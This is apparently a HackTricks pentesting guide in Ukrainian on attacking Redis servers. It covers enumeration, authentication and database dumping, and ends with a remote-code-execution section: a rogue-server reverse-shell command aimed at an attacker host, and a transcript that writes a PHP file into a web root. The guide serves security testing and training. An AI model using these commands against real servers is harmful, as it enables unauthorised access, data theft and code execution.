# 6379 - –ü–µ–Ω—Ç–µ—Å—Ç Redis

<details>

<summary><strong>–í–∏–≤—á–∞–π—Ç–µ —Ö–∞–∫—ñ–Ω–≥ AWS –≤—ñ–¥ –Ω—É–ª—è –¥–æ –≥–µ—Ä–æ—è –∑</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

–Ü–Ω—à—ñ —Å–ø–æ—Å–æ–±–∏ –ø—ñ–¥—Ç—Ä–∏–º–∫–∏ HackTricks:

* –Ø–∫—â–æ –≤–∏ —Ö–æ—á–µ—Ç–µ –ø–æ–±–∞—á–∏—Ç–∏ –≤–∞—à—É **–∫–æ–º–ø–∞–Ω—ñ—é –≤ —Ä–µ–∫–ª–∞–º—ñ –Ω–∞ HackTricks** –∞–±–æ **–∑–∞–≤–∞–Ω—Ç–∞–∂–∏—Ç–∏ HackTricks —É —Ñ–æ—Ä–º–∞—Ç—ñ PDF**, –ø–µ—Ä–µ–≤—ñ—Ä—Ç–µ [**–ü–õ–ê–ù–ò –ü–Ü–î–ü–ò–°–ö–ò**](https://github.com/sponsors/carlospolop)!
* –û—Ç—Ä–∏–º–∞–π—Ç–µ [**–æ—Ñ—ñ—Ü—ñ–π–Ω–∏–π PEASS & HackTricks –º–µ—Ä—á**](https://peass.creator-spring.com)
* –í—ñ–¥–∫—Ä–∏–π—Ç–µ –¥–ª—è —Å–µ–±–µ [**–°—ñ–º'—é PEASS**](https://opensea.io/collection/the-peass-family), –Ω–∞—à—É –∫–æ–ª–µ–∫—Ü—ñ—é –µ–∫—Å–∫–ª—é–∑–∏–≤–Ω–∏—Ö [**NFT**](https://opensea.io/collection/the-peass-family)
* **–ü—Ä–∏—î–¥–Ω—É–π—Ç–µ—Å—å –¥–æ** üí¨ [**–≥—Ä—É–ø–∏ Discord**](https://discord.gg/hRep4RUj7f) –∞–±–æ [**–≥—Ä—É–ø–∏ Telegram**](https://t.me/peass) –∞–±–æ **—Å–ª—ñ–¥–∫—É–π—Ç–µ** –∑–∞ –Ω–∞–º–∏ –Ω–∞ **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **–ü–æ–¥—ñ–ª—ñ—Ç—å—Å—è —Å–≤–æ—ó–º–∏ —Ö–∞–∫–µ—Ä—Å—å–∫–∏–º–∏ —Ç—Ä—é–∫–∞–º–∏, –Ω–∞–¥—Å–∏–ª–∞–π—Ç–µ PR –¥–æ** [**HackTricks**](https://github.com/carlospolop/hacktricks) —Ç–∞ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) —Ä–µ–ø–æ–∑–∏—Ç–æ—Ä—ñ—ó–≤.

</details>

<figure><img src="../.gitbook/assets/image (1) (3) (1).png" alt=""><figcaption></figcaption></figure>

–ü—Ä–∏—î–¥–Ω—É–π—Ç–µ—Å—å –¥–æ [**HackenProof Discord**](https://discord.com/invite/N3FrSbmwdy), —â–æ–± —Å–ø—ñ–ª–∫—É–≤–∞—Ç–∏—Å—è –∑ –¥–æ—Å–≤—ñ–¥—á–µ–Ω–∏–º–∏ —Ö–∞–∫–µ—Ä–∞–º–∏ —Ç–∞ –º–∏—Å–ª–∏–≤—Ü—è–º–∏ –∑–∞ –±–∞–≥–∞–º–∏!

**–Ü–Ω—Å–∞–π—Ç–∏ —â–æ–¥–æ –•–∞–∫—ñ–Ω–≥—É**\
–í–∑–∞—î–º–æ–¥—ñ–π—Ç–µ –∑ –∫–æ–Ω—Ç–µ–Ω—Ç–æ–º, —è–∫–∏–π –¥–æ—Å–ª—ñ–¥–∂—É—î –∑–∞—Ö–æ–ø–ª–µ–Ω–Ω—è —Ç–∞ –≤–∏–∫–ª–∏–∫–∏ —Ö–∞–∫—ñ–Ω–≥—É

**–ù–æ–≤–∏–Ω–∏ –ø—Ä–æ –•–∞–∫—ñ–Ω–≥ —É –†–µ–∞–ª—å–Ω–æ–º—É –ß–∞—Å—ñ**\
–ë—É–¥—å—Ç–µ –≤ –∫—É—Ä—Å—ñ —à–≤–∏–¥–∫–æ–∑–º—ñ–Ω–Ω–æ–≥–æ —Å–≤—ñ—Ç—É —Ö–∞–∫—ñ–Ω–≥—É –∑–∞–≤–¥—è–∫–∏ –Ω–æ–≤–∏–Ω–∞–º —Ç–∞ —ñ–Ω—Å–∞–π—Ç–∞–º —É —Ä–µ–∞–ª—å–Ω–æ–º—É —á–∞—Å—ñ

**–û—Å—Ç–∞–Ω–Ω—ñ –û–≥–æ–ª–æ—à–µ–Ω–Ω—è**\
–ë—É–¥—å—Ç–µ –≤ –∫—É—Ä—Å—ñ –Ω–∞–π–Ω–æ–≤—ñ—à–∏—Ö –∑–∞–ø—É—Å–∫—ñ–≤ –±–∞–≥ –±–∞—É–Ω—Ç—ñ —Ç–∞ –≤–∞–∂–ª–∏–≤–∏—Ö –æ–Ω–æ–≤–ª–µ–Ω—å –ø–ª–∞—Ç—Ñ–æ—Ä–º–∏

**–ü—Ä–∏—î–¥–Ω—É–π—Ç–µ—Å—å –¥–æ –Ω–∞—Å –Ω–∞** [**Discord**](https://discord.com/invite/N3FrSbmwdy) —Ç–∞ –ø–æ—á–Ω—ñ—Ç—å —Å–ø—ñ–≤–ø—Ä–∞—Ü—é–≤–∞—Ç–∏ –∑ —Ç–æ–ø–æ–≤–∏–º–∏ —Ö–∞–∫–µ—Ä–∞–º–∏ –≤–∂–µ —Å—å–æ–≥–æ–¥–Ω—ñ!

## –û—Å–Ω–æ–≤–Ω–∞ –Ü–Ω—Ñ–æ—Ä–º–∞—Ü—ñ—è

–ó [–¥–æ–∫—É–º–µ–Ω—Ç–∞—Ü—ñ—ó](https://redis.io/topics/introduction): Redis - —Ü–µ –≤—ñ–¥–∫—Ä–∏—Ç–µ –ø—Ä–æ–≥—Ä–∞–º–Ω–µ –∑–∞–±–µ–∑–ø–µ—á–µ–Ω–Ω—è (–ª—ñ—Ü–µ–Ω–∑—ñ—è BSD), —è–∫–µ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—î—Ç—å—Å—è —è–∫ **—Å—Ö–æ–≤–∏—â–µ —Å—Ç—Ä—É–∫—Ç—É—Ä –¥–∞–Ω–∏—Ö –≤ –ø–∞–º'—è—Ç—ñ**, –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—î—Ç—å—Å—è —è–∫ **–±–∞–∑–∞ –¥–∞–Ω–∏—Ö**, –∫–µ—à —Ç–∞ –ø–æ—Å–µ—Ä–µ–¥–Ω–∏–∫ –ø–æ–≤—ñ–¥–æ–º–ª–µ–Ω—å).

–ó–∞ –∑–∞–º–æ–≤—á—É–≤–∞–Ω–Ω—è–º Redis –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—î –ø—Ä–æ—Ç–æ–∫–æ–ª –Ω–∞ –æ—Å–Ω–æ–≤—ñ –ø—Ä–æ—Å—Ç–æ–≥–æ —Ç–µ–∫—Å—Ç—É, –∞–ª–µ —Å–ª—ñ–¥ –ø–∞–º'—è—Ç–∞—Ç–∏, —â–æ –≤—ñ–Ω —Ç–∞–∫–æ–∂ –º–æ–∂–µ —Ä–µ–∞–ª—ñ–∑—É–≤–∞—Ç–∏ **ssl/tls**. –î—ñ–∑–Ω–∞–π—Ç–µ—Å—è, —è–∫ [–∑–∞–ø—É—Å—Ç–∏—Ç–∏ Redis –∑ ssl/tls —Ç—É—Ç](https://fossies.org/linux/redis/TLS.md).

**–ü–æ—Ä—Ç –∑–∞ –∑–∞–º–æ–≤—á—É–≤–∞–Ω–Ω—è–º:** 6379
```
PORT     STATE SERVICE  VERSION
6379/tcp open  redis   Redis key-value store 4.0.9
```
## –ê–≤—Ç–æ–º–∞—Ç–∏—á–Ω–µ –ø–µ—Ä–µ–ª—ñ–∫—É–≤–∞–Ω–Ω—è

–î–µ—è–∫—ñ –∞–≤—Ç–æ–º–∞—Ç–∏–∑–æ–≤–∞–Ω—ñ —ñ–Ω—Å—Ç—Ä—É–º–µ–Ω—Ç–∏, —è–∫—ñ –º–æ–∂—É—Ç—å –¥–æ–ø–æ–º–æ–≥—Ç–∏ –æ—Ç—Ä–∏–º–∞—Ç–∏ —ñ–Ω—Ñ–æ—Ä–º–∞—Ü—ñ—é –∑ –µ–∫–∑–µ–º–ø–ª—è—Ä–∞ redis:
```bash
nmap --script redis-info -sV -p 6379 <IP>
msf> use auxiliary/scanner/redis/redis_server
```
## –†—É—á–Ω–µ –ø–µ—Ä–µ–ª—ñ–∫—É

### –ë–∞–Ω–µ—Ä

Redis - —Ü–µ **—Ç–µ–∫—Å—Ç–æ–≤–∏–π –ø—Ä–æ—Ç–æ–∫–æ–ª**, –≤–∏ –º–æ–∂–µ—Ç–µ –ø—Ä–æ—Å—Ç–æ **–Ω–∞–¥—ñ—Å–ª–∞—Ç–∏ –∫–æ–º–∞–Ω–¥—É —á–µ—Ä–µ–∑ —Å–æ–∫–µ—Ç**, —ñ –æ—Ç—Ä–∏–º–∞–Ω—ñ –∑–Ω–∞—á–µ–Ω–Ω—è –±—É–¥—É—Ç—å —á–∏—Ç–∞–±–µ–ª—å–Ω–∏–º–∏. –¢–∞–∫–æ–∂ –ø–∞–º'—è—Ç–∞–π—Ç–µ, —â–æ Redis –º–æ–∂–µ –ø—Ä–∞—Ü—é–≤–∞—Ç–∏ –∑ –≤–∏–∫–æ—Ä–∏—Å—Ç–∞–Ω–Ω—è–º **ssl/tls** (–∞–ª–µ —Ü–µ –¥—É–∂–µ –¥–∏–≤–Ω–æ).

–£ –∑–≤–∏—á–∞–π–Ω–æ–º—É –µ–∫–∑–µ–º–ø–ª—è—Ä—ñ Redis –≤–∏ –º–æ–∂–µ—Ç–µ –ø—Ä–æ—Å—Ç–æ –ø—ñ–¥–∫–ª—é—á–∏—Ç–∏—Å—è –∑–∞ –¥–æ–ø–æ–º–æ–≥–æ—é `nc` –∞–±–æ —Ç–∞–∫–æ–∂ –º–æ–∂–µ—Ç–µ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–≤–∞—Ç–∏ `redis-cli`:
```bash
nc -vn 10.10.10.10 6379
redis-cli -h 10.10.10.10 # sudo apt-get install redis-tools
```
–ü–µ—Ä—à–æ—é –∫–æ–º–∞–Ω–¥–æ—é, —è–∫—É –≤–∏ –º–æ–∂–µ—Ç–µ —Å–ø—Ä–æ–±—É–≤–∞—Ç–∏, —î `info`. –í–æ–Ω–∞ –º–æ–∂–µ –ø–æ–≤–µ—Ä–Ω—É—Ç–∏ –≤–∏–≤—ñ–¥ —ñ–∑ —ñ–Ω—Ñ–æ—Ä–º–∞—Ü—ñ—î—é –ø—Ä–æ –µ–∫–∑–µ–º–ø–ª—è—Ä Redis –∞–±–æ —â–æ—Å—å –ø–æ–¥—ñ–±–Ω–µ –¥–æ –Ω–∞—Å—Ç—É–ø–Ω–æ–≥–æ:
```
-NOAUTH Authentication required.
```
–£ —Ü—å–æ–º—É –æ—Å—Ç–∞–Ω–Ω—å–æ–º—É –≤–∏–ø–∞–¥–∫—É —Ü–µ –æ–∑–Ω–∞—á–∞—î, —â–æ **–≤–∞–º –ø–æ—Ç—Ä—ñ–±–Ω—ñ –¥—ñ–π—Å–Ω—ñ –æ–±–ª—ñ–∫–æ–≤—ñ –¥–∞–Ω—ñ**, —â–æ–± –æ—Ç—Ä–∏–º–∞—Ç–∏ –¥–æ—Å—Ç—É–ø –¥–æ –µ–∫–∑–µ–º–ø–ª—è—Ä–∞ Redis.

### –ê—É—Ç–µ–Ω—Ç–∏—Ñ—ñ–∫–∞—Ü—ñ—è Redis

–ó–∞ –∑–∞–º–æ–≤—á—É–≤–∞–Ω–Ω—è–º Redis –º–æ–∂–Ω–∞ –æ—Ç—Ä–∏–º–∞—Ç–∏ –¥–æ—Å—Ç—É–ø **–±–µ–∑ –æ–±–ª—ñ–∫–æ–≤–∏—Ö –¥–∞–Ω–∏—Ö**. –û–¥–Ω–∞–∫ –π–æ–≥–æ –º–æ–∂–Ω–∞ **–Ω–∞–ª–∞—à—Ç—É–≤–∞—Ç–∏** –¥–ª—è –ø—ñ–¥—Ç—Ä–∏–º–∫–∏ **—Ç—ñ–ª—å–∫–∏ –ø–∞—Ä–æ–ª—è –∞–±–æ —ñ–º–µ–Ω—ñ –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–∞ + –ø–∞—Ä–æ–ª—è**.\
–ú–æ–∂–ª–∏–≤–æ **–≤—Å—Ç–∞–Ω–æ–≤–∏—Ç–∏ –ø–∞—Ä–æ–ª—å** –≤ —Ñ–∞–π–ª—ñ _**redis.conf**_ –∑ –ø–∞—Ä–∞–º–µ—Ç—Ä–æ–º `requirepass` **–∞–±–æ —Ç–∏–º—á–∞—Å–æ–≤–æ** –¥–æ –ø–µ—Ä–µ–∑–∞–ø—É—Å–∫—É —Å–ª—É–∂–±–∏, –ø—ñ–¥–∫–ª—é—á–∏–≤—à–∏—Å—å –¥–æ –Ω–µ—ó —Ç–∞ –≤–∏–∫–æ–Ω–∞–≤—à–∏: `config set requirepass p@ss$12E45`.\
–¢–∞–∫–æ–∂ **—ñ–º'—è –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–∞** –º–æ–∂–Ω–∞ –Ω–∞–ª–∞—à—Ç—É–≤–∞—Ç–∏ –≤ –ø–∞—Ä–∞–º–µ—Ç—Ä—ñ `masteruser` –≤—Å–µ—Ä–µ–¥–∏–Ω—ñ —Ñ–∞–π–ª—É _**redis.conf**_.

{% hint style="info" %}
–Ø–∫—â–æ –Ω–∞–ª–∞—à—Ç–æ–≤–∞–Ω–∏–π –ª–∏—à–µ –ø–∞—Ä–æ–ª—å, —Ç–æ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—î—Ç—å—Å—è —ñ–º'—è –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–∞ "**default**".\
–¢–∞–∫–æ–∂ —Å–ª—ñ–¥ –∑–∞—É–≤–∞–∂–∏—Ç–∏, —â–æ **–∑–æ–≤–Ω—ñ—à–Ω—ñ–º —á–∏–Ω–æ–º –Ω–µ–º–æ–∂–ª–∏–≤–æ –≤–∏–∑–Ω–∞—á–∏—Ç–∏**, —á–∏ –±—É–ª–æ Redis –Ω–∞–ª–∞—à—Ç–æ–≤–∞–Ω–æ –ª–∏—à–µ –∑ –ø–∞—Ä–æ–ª–µ–º —á–∏ —ñ–º'—è–º –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–∞ + –ø–∞—Ä–æ–ª–µ–º.
{% endhint %}

–£ –≤–∏–ø–∞–¥–∫–∞—Ö, –ø–æ–¥—ñ–±–Ω–∏—Ö –¥–æ —Ü—å–æ–≥–æ, –≤–∞–º **–ø–æ—Ç—Ä—ñ–±–Ω–æ –∑–Ω–∞–π—Ç–∏ –¥—ñ–π—Å–Ω—ñ –æ–±–ª—ñ–∫–æ–≤—ñ –¥–∞–Ω—ñ**, —â–æ–± –≤–∑–∞—î–º–æ–¥—ñ—è—Ç–∏ –∑ Redis, —Ç–æ–º—É –≤–∏ –º–æ–∂–µ—Ç–µ —Å–ø—Ä–æ–±—É–≤–∞—Ç–∏ [**–ø–µ—Ä–µ–±—Ä–∞—Ç–∏**](../generic-methodologies-and-resources/brute-force.md#redis) —ó—Ö.\
**–Ø–∫—â–æ –≤–∏ –∑–Ω–∞–π—à–ª–∏ –¥—ñ–π—Å–Ω—ñ –æ–±–ª—ñ–∫–æ–≤—ñ –¥–∞–Ω—ñ, –≤–∞–º –ø–æ—Ç—Ä—ñ–±–Ω–æ –∞—É—Ç–µ–Ω—Ç–∏—Ñ—ñ–∫—É–≤–∞—Ç–∏ —Å–µ–∞–Ω—Å** –ø—ñ—Å–ª—è –≤—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω–Ω—è –∑'—î–¥–Ω–∞–Ω–Ω—è –∑–∞ –¥–æ–ø–æ–º–æ–≥–æ—é –∫–æ–º–∞–Ω–¥–∏:
```bash
AUTH <username> <password>
```
**–î—ñ–π—Å–Ω—ñ –æ–±–ª—ñ–∫–æ–≤—ñ –¥–∞–Ω—ñ** –±—É–¥—É—Ç—å –≤—ñ–¥–ø–æ–≤—ñ–¥–∞—Ç–∏: `+OK`

### **–ê—É—Ç–µ–Ω—Ç–∏—Ñ—ñ–∫–æ–≤–∞–Ω–µ –ø–µ—Ä–µ–ª—ñ–∫—É**

–Ø–∫—â–æ —Å–µ—Ä–≤–µ—Ä Redis –¥–æ–∑–≤–æ–ª—è—î **–∞–Ω–æ–Ω—ñ–º–Ω—ñ –ø—ñ–¥–∫–ª—é—á–µ–Ω–Ω—è** –∞–±–æ —è–∫—â–æ –≤–∏ –æ—Ç—Ä–∏–º–∞–ª–∏ –¥—ñ–π—Å–Ω—ñ –æ–±–ª—ñ–∫–æ–≤—ñ –¥–∞–Ω—ñ, –≤–∏ –º–æ–∂–µ—Ç–µ —ñ–Ω—ñ—Ü—ñ—é–≤–∞—Ç–∏ –ø—Ä–æ—Ü–µ—Å –ø–µ—Ä–µ–ª—ñ–∫—É —Å–ª—É–∂–±–∏, –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—é—á–∏ –Ω–∞—Å—Ç—É–ø–Ω—ñ **–∫–æ–º–∞–Ω–¥–∏**:
```bash
INFO
[ ... Redis response with info ... ]
client list
[ ... Redis response with connected clients ... ]
CONFIG GET *
[ ... Get config ... ]
```
**–Ü–Ω—à—ñ –∫–æ–º–∞–Ω–¥–∏ Redis** [**–º–æ–∂–Ω–∞ –∑–Ω–∞–π—Ç–∏ —Ç—É—Ç**](https://redis.io/topics/data-types-intro) **—ñ** [**—Ç—É—Ç**](https://lzone.de/cheat-sheet/Redis)**.**

–ó–≤–µ—Ä–Ω—ñ—Ç—å —É–≤–∞–≥—É, —â–æ **–∫–æ–º–∞–Ω–¥–∏ Redis –µ–∫–∑–µ–º–ø–ª—è—Ä–∞ –º–æ–∂—É—Ç—å –±—É—Ç–∏ –ø–µ—Ä–µ–π–º–µ–Ω–æ–≤–∞–Ω—ñ** –∞–±–æ –≤–∏–¥–∞–ª–µ–Ω—ñ –≤ —Ñ–∞–π–ª—ñ _redis.conf_. –ù–∞–ø—Ä–∏–∫–ª–∞–¥, —Ü–µ–π —Ä—è–¥–æ–∫ –≤–∏–¥–∞–ª–∏—Ç—å –∫–æ–º–∞–Ω–¥—É FLUSHDB:
```
rename-command FLUSHDB ""
```
–î–æ–¥–∞—Ç–∫–æ–≤—É —ñ–Ω—Ñ–æ—Ä–º–∞—Ü—ñ—é –ø—Ä–æ –±–µ–∑–ø–µ—á–Ω—É –Ω–∞—Å—Ç—Ä–æ–π–∫—É —Å–ª—É–∂–±–∏ Redis –º–æ–∂–Ω–∞ –∑–Ω–∞–π—Ç–∏ —Ç—É—Ç: [https://www.digitalocean.com/community/tutorials/how-to-install-and-secure-redis-on-ubuntu-18-04](https://www.digitalocean.com/community/tutorials/how-to-install-and-secure-redis-on-ubuntu-18-04)

–í–∏ —Ç–∞–∫–æ–∂ –º–æ–∂–µ—Ç–µ **–º–æ–Ω—ñ—Ç–æ—Ä–∏—Ç–∏ –≤ —Ä–µ–∞–ª—å–Ω–æ–º—É —á–∞—Å—ñ –≤–∏–∫–æ–Ω–∞–Ω—ñ –∫–æ–º–∞–Ω–¥–∏ Redis** –∑–∞ –¥–æ–ø–æ–º–æ–≥–æ—é –∫–æ–º–∞–Ω–¥–∏ **`monitor`** –∞–±–æ –æ—Ç—Ä–∏–º–∞—Ç–∏ —Ç–æ–ø **25 –Ω–∞–π–ø–æ–≤—ñ–ª—å–Ω—ñ—à–∏—Ö –∑–∞–ø–∏—Ç—ñ–≤** –∑–∞ –¥–æ–ø–æ–º–æ–≥–æ—é **`slowlog get 25`**

–î—ñ–∑–Ω–∞–π—Ç–µ—Å—è –±—ñ–ª—å—à–µ —Ü—ñ–∫–∞–≤–æ—ó —ñ–Ω—Ñ–æ—Ä–º–∞—Ü—ñ—ó –ø—Ä–æ —ñ–Ω—à—ñ –∫–æ–º–∞–Ω–¥–∏ Redis —Ç—É—Ç: [https://lzone.de/cheat-sheet/Redis](https://lzone.de/cheat-sheet/Redis)

### **–í–∏–≤–µ–¥–µ–Ω–Ω—è –±–∞–∑–∏ –¥–∞–Ω–∏—Ö**

–£ Redis **–±–∞–∑–∏ –¥–∞–Ω–∏—Ö –º–∞—é—Ç—å –Ω–æ–º–µ—Ä–∏, —â–æ –ø–æ—á–∏–Ω–∞—é—Ç—å—Å—è –∑ 0**. –í–∏ –º–æ–∂–µ—Ç–µ –ø–µ—Ä–µ–≤—ñ—Ä–∏—Ç–∏, —á–∏ —è–∫–∞-–Ω–µ–±—É–¥—å –∑ –Ω–∏—Ö –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—î—Ç—å—Å—è —É –≤–∏–≤–æ–¥—ñ –∫–æ–º–∞–Ω–¥–∏ `info` –≤ —Ä–æ–∑–¥—ñ–ª—ñ "Keyspace":

![](<../.gitbook/assets/image (315).png>)

–ê–±–æ –≤–∏ –º–æ–∂–µ—Ç–µ –ø—Ä–æ—Å—Ç–æ –æ—Ç—Ä–∏–º–∞—Ç–∏ –≤—Å—ñ **keyspaces** (–±–∞–∑–∏ –¥–∞–Ω–∏—Ö) –∑–∞ –¥–æ–ø–æ–º–æ–≥–æ—é:
```
INFO keyspace
```
–£ —Ü—å–æ–º—É –ø—Ä–∏–∫–ª–∞–¥—ñ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—é—Ç—å—Å—è **–±–∞–∑–∏ –¥–∞–Ω–∏—Ö 0 —Ç–∞ 1**. **–ë–∞–∑–∞ –¥–∞–Ω–∏—Ö 0 –º—ñ—Å—Ç–∏—Ç—å 4 –∫–ª—é—á—ñ, –∞ –±–∞–∑–∞ –¥–∞–Ω–∏—Ö 1 –º—ñ—Å—Ç–∏—Ç—å 1**. –ó–∞ –∑–∞–º–æ–≤—á—É–≤–∞–Ω–Ω—è–º Redis –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–≤–∞—Ç–∏–º–µ –±–∞–∑—É –¥–∞–Ω–∏—Ö 0. –©–æ–±, –Ω–∞–ø—Ä–∏–∫–ª–∞–¥, –≤–∏–≤–∞–Ω—Ç–∞–∂–∏—Ç–∏ –±–∞–∑—É –¥–∞–Ω–∏—Ö 1, –≤–∞–º –ø–æ—Ç—Ä—ñ–±–Ω–æ –≤–∏–∫–æ–Ω–∞—Ç–∏:
```bash
SELECT 1
[ ... Indicate the database ... ]
KEYS *
[ ... Get Keys ... ]
GET <KEY>
[ ... Get Key ... ]
```
–£ —Ä–∞–∑—ñ –æ—Ç—Ä–∏–º–∞–Ω–Ω—è –Ω–∞—Å—Ç—É–ø–Ω–æ—ó –ø–æ–º–∏–ª–∫–∏ `-WRONGTYPE –û–ø–µ—Ä–∞—Ü—ñ—è –ø—Ä–æ—Ç–∏ –∫–ª—é—á–∞, —è–∫–∏–π –º—ñ—Å—Ç–∏—Ç—å –Ω–µ–ø—Ä–∞–≤–∏–ª—å–Ω–∏–π —Ç–∏–ø –∑–Ω–∞—á–µ–Ω–Ω—è` –ø—ñ–¥ —á–∞—Å –≤–∏–∫–æ–Ω–∞–Ω–Ω—è `GET <KEY>` —Ü–µ —Ç–æ–º—É, —â–æ –∫–ª—é—á –º–æ–∂–µ –±—É—Ç–∏ —á–∏–º–æ—Å—å —ñ–Ω—à–∏–º, –Ω—ñ–∂ —Ä—è–¥–æ–∫ –∞–±–æ —Ü—ñ–ª–µ —á–∏—Å–ª–æ —ñ –≤–∏–º–∞–≥–∞—î —Å–ø–µ—Ü—ñ–∞–ª—å–Ω–æ–≥–æ –æ–ø–µ—Ä–∞—Ç–æ—Ä–∞ –¥–ª—è –≤—ñ–¥–æ–±—Ä–∞–∂–µ–Ω–Ω—è –π–æ–≥–æ.

–©–æ–± –¥—ñ–∑–Ω–∞—Ç–∏—Å—è —Ç–∏–ø –∫–ª—é—á–∞, –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–π—Ç–µ –∫–æ–º–∞–Ω–¥—É `TYPE`, –ø—Ä–∏–∫–ª–∞–¥ –Ω–∏–∂—á–µ –¥–ª—è –∫–ª—é—á—ñ–≤ —Å–ø–∏—Å–∫—É —Ç–∞ —Ö–µ—à—É.
```bash
TYPE <KEY>
[ ... Type of the Key ... ]
LRANGE <KEY> 0 -1
[ ... Get list items ... ]
HGET <KEY> <FIELD>
[ ... Get hash item ... ]

# If the type used is weird you can always do:
DUMP <key>
```
**–í–∏–≤–∞–Ω—Ç–∞–∂–µ–Ω–Ω—è –±–∞–∑–∏ –¥–∞–Ω–∏—Ö –∑–∞ –¥–æ–ø–æ–º–æ–≥–æ—é npm** [**redis-dump**](https://www.npmjs.com/package/redis-dump) **–∞–±–æ python** [**redis-utils**](https://pypi.org/project/redis-utils/)

<figure><img src="../.gitbook/assets/image (1) (3) (1).png" alt=""><figcaption></figcaption></figure>

–ü—Ä–∏—î–¥–Ω—É–π—Ç–µ—Å—å –¥–æ —Å–µ—Ä–≤–µ—Ä–∞ [**HackenProof Discord**](https://discord.com/invite/N3FrSbmwdy), —â–æ–± —Å–ø—ñ–ª–∫—É–≤–∞—Ç–∏—Å—è –∑ –¥–æ—Å–≤—ñ–¥—á–µ–Ω–∏–º–∏ —Ö–∞–∫–µ—Ä–∞–º–∏ —Ç–∞ –º–∏—Å–ª–∏–≤—Ü—è–º–∏ –∑–∞ –±–∞–≥–∞–º–∏!

**–Ü–Ω—Å–∞–π—Ç–∏ —â–æ–¥–æ –•–∞–∫—ñ–Ω–≥—É**\
–í–∑–∞—î–º–æ–¥—ñ–π—Ç–µ –∑ –∫–æ–Ω—Ç–µ–Ω—Ç–æ–º, —è–∫–∏–π –¥–æ—Å–ª—ñ–¥–∂—É—î –∑–∞—Ö–æ–ø–ª–µ–Ω–Ω—è —Ç–∞ –≤–∏–∫–ª–∏–∫–∏ —Ö–∞–∫—ñ–Ω–≥—É

**–ù–æ–≤–∏–Ω–∏ –ø—Ä–æ –•–∞–∫—ñ–Ω–≥ —É –†–µ–∞–ª—å–Ω–æ–º—É –ß–∞—Å—ñ**\
–ë—É–¥—å—Ç–µ –≤ –∫—É—Ä—Å—ñ —à–≤–∏–¥–∫–æ–∑–º—ñ–Ω–Ω–æ–≥–æ —Å–≤—ñ—Ç—É —Ö–∞–∫—ñ–Ω–≥—É –∑–∞–≤–¥—è–∫–∏ –Ω–æ–≤–∏–Ω–∞–º —Ç–∞ —ñ–Ω—Å–∞–π—Ç–∞–º —É —Ä–µ–∞–ª—å–Ω–æ–º—É —á–∞—Å—ñ

**–û—Å—Ç–∞–Ω–Ω—ñ –û–≥–æ–ª–æ—à–µ–Ω–Ω—è**\
–ë—É–¥—å—Ç–µ –≤ –∫—É—Ä—Å—ñ –Ω–∞–π–Ω–æ–≤—ñ—à–∏—Ö –±–∞–≥-–±–∞—É–Ω—Ç—ñ, —è–∫—ñ –∑–∞–ø—É—Å–∫–∞—é—Ç—å—Å—è, —Ç–∞ –≤–∞–∂–ª–∏–≤–∏—Ö –æ–Ω–æ–≤–ª–µ–Ω—å –ø–ª–∞—Ç—Ñ–æ—Ä–º–∏

–ü—Ä–∏—î–¥–Ω—É–π—Ç–µ—Å—å –¥–æ –Ω–∞—Å –Ω–∞ [**Discord**](https://discord.com/invite/N3FrSbmwdy) —Ç–∞ –ø–æ—á–Ω—ñ—Ç—å —Å–ø—ñ–≤–ø—Ä–∞—Ü—é–≤–∞—Ç–∏ –∑ –Ω–∞–π–∫—Ä–∞—â–∏–º–∏ —Ö–∞–∫–µ—Ä–∞–º–∏ –≤–∂–µ —Å—å–æ–≥–æ–¥–Ω—ñ!

## Redis RCE

### –Ü–Ω—Ç–µ—Ä–∞–∫—Ç–∏–≤–Ω–∞ –û–±–æ–ª–æ–Ω–∫–∞

[**redis-rogue-server**](https://github.com/n0b0dyCN/redis-rogue-server) –º–æ–∂–µ –∞–≤—Ç–æ–º–∞—Ç–∏—á–Ω–æ –æ—Ç—Ä–∏–º–∞—Ç–∏ —ñ–Ω—Ç–µ—Ä–∞–∫—Ç–∏–≤–Ω—É –æ–±–æ–ª–æ–Ω–∫—É –∞–±–æ –∑–≤–æ—Ä–æ—Ç–Ω—é –æ–±–æ–ª–æ–Ω–∫—É –≤ Redis (<=5.0.5).
```
./redis-rogue-server.py --rhost <TARGET_IP> --lhost <ACCACKER_IP>
```
### PHP –í–µ–±-–æ–±–æ–ª–æ–Ω–∫–∞

–Ü–Ω—Ñ–æ—Ä–º–∞—Ü—ñ—è –∑ [**—Ç—É—Ç**](https://web.archive.org/web/20191201022931/http://reverse-tcp.xyz/pentest/database/2017/02/09/Redis-Hacking-Tips.html). –í–∞–º –ø–æ—Ç—Ä—ñ–±–Ω–æ –∑–Ω–∞—Ç–∏ **—à–ª—è—Ö** –¥–æ **–ø–∞–ø–∫–∏ –≤–µ–±-—Å–∞–π—Ç—É**:
```
root@Urahara:~# redis-cli -h 10.85.0.52
10.85.0.52:6379> config set dir /usr/share/nginx/html
OK
10.85.0.52:6379> config set dbfilename redis.php
OK
10.85.0.52:6379> set test "<?php phpinfo(); ?>"
OK
10.85.0.52:6379> save
OK
```
